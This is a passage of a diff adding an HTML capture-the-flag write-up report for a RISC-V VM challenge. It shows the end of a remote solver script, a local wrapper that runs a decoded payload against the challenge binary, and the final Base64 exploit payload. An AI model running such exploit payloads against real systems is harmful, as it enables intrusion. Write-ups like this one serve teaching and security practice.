+            text = attempt(host, port, payload)
+        except OSError as exc:
+            text = f&quot;[connect error] {exc}&quot;
+
+        print(f&quot;--- attempt {i + 1}/{tries} ---&quot;)
+        print(text.replace(&quot;\x00&quot;, &quot;&quot;))
+
+        match = re.search(r&quot;OmniCTF\{[^}\n]*\}&quot;, text)
+        if match:
+            print(f&quot;FLAG={match.group(0)}&quot;)
+            return 0
+
+        if &quot;HTTP/1.1 400 Bad Request&quot; in text or &quot;404 page not found&quot; in text:
+            print(&quot;[!] Reached HTTP frontend, not the raw challenge backend.&quot;)
+            return 2
+
+        time.sleep(1)
+
+    return 1
+
+
+if __name__ == &quot;__main__&quot;:
+    raise SystemExit(main())
+</code></pre></div>
+</details>
+<details class="file">
+  <summary><span>SocketHandler.py / local wrapper</span><span class="meta">1,203 bytes / SHA256 64A0F475D794FAE5...</span></summary>
+  <div class="codebox"><pre><code class="language-py">import subprocess
+from base64 import b64decode
+import pathlib
+
+
+script_dir = pathlib.Path(__file__).parent.resolve()
+bin_path = script_dir / &quot;RV64VMv4.exe&quot;
+pattern_path = script_dir / &quot;.flag_pattern&quot;
+exploit_path = script_dir / &quot;exploit.bin&quot;
+
+try:
+    with open(pattern_path, &quot;rb&quot;) as pattern_file:
+        MAGIC_PATTERN = pattern_file.read().strip()
+except FileNotFoundError:
+    print(&quot;[-] .flag_pattern file not found&quot;)
+    exit(1)
+
+enc_data = input(&quot;Enter payload encoded in Base64: &quot;)
+
+with open(exploit_path, &quot;wb&quot;) as f:
+    data = b64decode(enc_data)
+    print(&quot;[*] Decoding and writing to exploit.bin...&quot;)
+    print(f&quot;[*] Raw payload size: {len(data)}&quot;)
+    f.write(data)
+
+try:
+    result = subprocess.run(
+        [bin_path, exploit_path],
+        capture_output=True,
+        check=False
+    )
+    output = result.stdout + result.stderr
+except FileNotFoundError:
+    print(f&quot;[-] {bin_path.name} not found&quot;)
+    exit(1)
+
+flag_found = False
+for line in output.split(b&quot;\n&quot;):
+    if MAGIC_PATTERN in line:
+        print(line.decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;).strip())
+        flag_found = True
+        break
+
+if not flag_found:
+    print(&quot;[-] No flag&quot;)
+</code></pre></div>
+</details>
+<details class="file">
+  <summary><span>exploit_aslr_0x8000.b64 / final Base64 payload</span><span class="meta">984 chars / SHA256 86572FAA322FD9E4...</span></summary>
+  <div class="codebox"><pre><code class="language-text">FwQAABMEBO+TAgAAk5JCAJOCggCTkkIAk4ICAJOSQgCTggIAk5JCAJOCAgCzBFRAMwkEAGP0JBuDuQQAk5IJA2OaAhiT0okCEwMAABMTQwATA3MAExNDABMD8wBjnGIWg9IJABMDAAATE0MAEwNTABMTQwATA6MAExNDABMDQwATE0MAEwPTAGOWYhSD4skDEwMAABMTQwATAxMAExNDABMDAwATE0MAEwMDABMTQwATAwMAY/BiEjODWQCDYwMAEw4AABMeTgATDk4AEx5OABMOXgATHk4AEw5eABMeTgATDg4AY5jDD4NaYwCDXkMBA2oDBWOACg6TAgAAk5JCAJOCYgCTkkIAk4ICAGPkUg2TAgAAk5JCAJOCEgCTkkIAk4ICAJOSQgCTggIAk5JCAJOCAgBjYFoKkwIAAJOSQgCTghIAk5JCAJOCAgCTkkIAk4ICAJOSQgCTggIAk5JCAJOCAgCTkkIAk4ICAJOSQgCTggIAY+BCBzML0wETC4sBkwsAAGP4WwWDYosAA2PLAINjCwEDbksCEx4eAmNWDgIzjAIAY/RyADOMAwBjDgwAY3xDAbMDakBj6IMBM4ZpALMGDADvAAACk4sbABMLiwJv8F/7k4SEAG/w3+WTCNAFcwAAAJMCAABj+tIOMwNWAINDAwATDgACY+7DDRMO8Adj+sMNs44CAGP83gozj15Akw8AAJOfTwCTjx8Ak59PAJOPDwCTn08Ak48PAGN6/wkzA9YBg0MDABMOAAJj6sMBEw7wB2P2wwGTjh4Ab/Df+2OYAwaTDwAAk59PAJOPjwBjYP8HM4cCAJMHAAATCAAAY3bXAzMD5gCDQwMAEw6wB2OUwwGTBxAAEw7QB2OUwwETCBAAEwcXAG/wn/1jggcCYwAIAjMFVgCTCEAGcwAAAJMIcAZzAAAAk4IeAG/w3/Jj5tIBk4ISAG/wH/Kzgg4Ab/Cf8ZOCEgBv8B/xZ4AAAA==
+</code></pre></div>
+</details></section></main>
+    <aside aria-label="Table of contents">
+      <strong>Report Contents</strong>
+      <ul class="toc"><li><a href="#summary">Summary</a></li><li><a href="#challenge">Challenge</a></li><li><a href="#tools">Tools</a></li><li><a href="#analysis">Analysis</a></li><li><a href="#design">Exploit Design</a></li><li><a href="#artifacts">Artifacts</a></li><li><a href="#local">Local Validation</a></li><li><a href="#remote">Remote Execution</a></li><li><a href="#appendix">Appendix</a></li></ul>
+    </aside>
+  </div>
+  <footer class="footer">Prepared as a formal CTF write-up report. All scripts referenced by the final solution are embedded in the appendices.</footer>
+  <script>
+const progress = document.getElementById("progressBar");
+const updateProgress = () => {
+  const top = document.documentElement.scrollTop || document.body.scrollTop;
+  const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+  progress.style.width = `${height ? (top / height) * 100 : 0}%`;
+};
+window.addEventListener("scroll", updateProgress, { passive: true });
+updateProgress();
+
+document.querySelectorAll("pre").forEach((pre) => {
+  const button = document.createElement("button");
+  button.type = "button";
+  button.className = "copy";
+  button.textContent = "Copy";
+  button.addEventListener("click", async () => {
+    try {
+      await navigator.clipboard.writeText(pre.innerText);
+      button.textContent = "Copied";
+    } catch {
+      button.textContent = "Select";
+    }
+    setTimeout(() => button.textContent = "Copy", 1200);
+  });
+  pre.parentElement.prepend(button);
+});
+
+const links = Array.from(document.querySelectorAll(".toc a"));
+const sections = links.map((link) => document.querySelector(link.getAttribute("href"))).filter(Boolean);
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach((entry) => {
+    if (!entry.isIntersecting) return;
+    links.forEach((link) => link.classList.remove("active"));
+    const current = links.find((link) => link.getAttribute("href") === `#${entry.target.id}`);
+    if (current) current.classList.add("active");
+  });
+}, { rootMargin: "-30% 0px -60% 0px", threshold: 0.01 });
+sections.forEach((section) => observer.observe(section));
+</script>
+</body>
+</html>
